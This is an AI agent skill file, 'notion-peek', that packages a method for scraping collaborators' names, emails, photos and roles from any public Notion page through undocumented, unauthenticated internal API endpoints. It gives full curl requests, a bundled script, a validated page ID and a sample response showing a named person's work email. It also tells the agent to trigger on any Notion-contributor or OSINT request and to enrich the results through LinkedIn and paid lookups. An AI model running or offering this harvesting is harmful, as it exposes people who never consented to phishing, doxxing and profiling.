---
name: notion-peek
description: "Extract collaborator emails, names, and profiles from any public Notion page using Notion's undocumented internal API (NotionPeek). Use this skill ANY TIME the user asks to find who works on a Notion page, look up Notion collaborators or editors, extract emails from a Notion URL, identify contributors to a Notion doc, or do OSINT/reconnaissance on a Notion workspace. Also triggers for 'who made this Notion page', 'find emails from Notion', 'Notion page contributors', 'peek at a Notion page', or any request involving extracting people/contact data from Notion links. This skill works without any API key or authentication — it uses Notion's internal v3 endpoints that return user data for public pages with zero auth."
---

# NotionPeek — Peek Behind Any Notion Page

Extract names, emails, profile photos, and roles from any public Notion page. No API key needed.

## How It Works

Notion's internal `/api/v3/` endpoints return full user profiles (name, email, photo, role) for anyone who has edited or been granted access to a public page. These endpoints require no authentication — the same data is sent to every browser that loads the page, just not displayed in the UI.

**Two-step process:**
1. `POST /api/v3/loadPageChunk` with the page ID → returns block tree with user IDs in permissions
2. `POST /api/v3/syncRecordValuesMain` with those user IDs → returns full profiles with emails

## Quick Usage

Run the bundled script:

```bash
python3 scripts/notion_lookup.py "https://notion.so/workspace/Page-Title-abc123def456"
```

Or for just a page ID:

```bash
python3 scripts/notion_lookup.py "04f306fb-f59a-413f-ae15-f42e2a1ab029"
```

## Manual Implementation

If you need to integrate this into a larger workflow rather than using the script, here's the logic:

### Step 1: Extract Page ID from URL

The page ID is the last 32 hex characters in the URL. Notion URLs vary in format:

```
https://www.notion.so/workspace/Page-Title-04f306fbf59a413fae15f42e2a1ab029
https://notion.site/Page-Title-04f306fb-f59a-413f-ae15-f42e2a1ab029
https://notion.so/04f306fbf59a413fae15f42e2a1ab029
```

Strip all dashes, extract the last 32 hex chars, reformat as UUID: `{8}-{4}-{4}-{4}-{12}`.

### Step 2: Load Page Chunk

```bash
curl -s -X POST "https://www.notion.so/api/v3/loadPageChunk" \
  -H "Content-Type: application/json" \
  -d '{
    "pageId": "PAGE_ID_HERE",
    "limit": 100,
    "cursor": {"stack": []},
    "chunkNumber": 0,
    "verticalColumns": false
  }'
```

No auth headers. No cookies. Just the Content-Type.

### Step 3: Extract User IDs

Walk the JSON response looking for:
- Keys in `recordMap.notion_user` (direct user ID keys)
- Objects with `"type": "user_permission"` that contain a `"user_id"` field

Collect all unique user IDs.

### Step 4: Resolve User Profiles

```bash
curl -s -X POST "https://www.notion.so/api/v3/syncRecordValuesMain" \
  -H "Content-Type: application/json" \
  -d '{
    "requests": [
      {"pointer": {"table": "notion_user", "id": "USER_ID"}, "version": -1}
    ]
  }'
```

Send all user IDs in one request. Each entry in the requests array resolves one user.

### Step 5: Parse Profiles

**Critical:** The response has double nesting. Profile data is at:
```
recordMap.notion_user.{id}.value.value.{name, email, profile_photo}
```

And role is at:
```
recordMap.notion_user.{id}.value.role
```

Example response structure:
```json
{
  "recordMap": {
    "notion_user": {
      "310af75a-...": {
        "value": {
          "value": {
            "id": "310af75a-...",
            "name": "Jonathan Cline",
            "email": "jcline@makenotion.com",
            "profile_photo": "https://s3-us-west-2.amazonaws.com/...",
            "onboarding_completed": true,
            "version": 9
          },
          "role": "reader"
        }
      }
    }
  }
}
```

## Enrichment Options

After extracting collaborator data, you can enrich it further:

### Domain Parsing (free, instant)

Extract company name from email domain. Maintain a lookup for known mappings:
- `makenotion.com` → Notion
- `course.studio` → Course Studio
- Common domains map directly: `google.com` → Google, `meta.com` → Meta

### Google Programmable Search Engine (free, 100 queries/day)

Search `"{name}" "{company}" site:linkedin.com/in/` to find their LinkedIn profile and job title from the search snippet. Requires a Google CSE API key (free tier: 100/day).

### Proxycurl (paid, ~$0.01/lookup)

Look up LinkedIn profiles by email for full profile data including current title, company, and bio. Best data quality but costs money.

## Limitations

- **Public pages only.** Private pages return an error. There is no workaround without a Notion `token_v2` session cookie.
- **Undocumented API.** Notion can change or block these endpoints at any time.
- **Bot permissions show up too.** Filter out entries where the user data looks like a bot (check for `bot_id` in the permission objects).
- **Rate limits are unknown.** Notion may rate-limit aggressive usage. Space requests if doing bulk lookups.
- **Email accuracy.** Emails are whatever the user signed up to Notion with — usually corporate, but sometimes personal Gmail etc.

## Verified Working (April 2026)

Tested and confirmed working with zero authentication on April 19, 2026. The following page ID was used for validation:

```
04f306fb-f59a-413f-ae15-f42e2a1ab029
```

This returned 11 user profiles with full names and `@makenotion.com` email addresses.
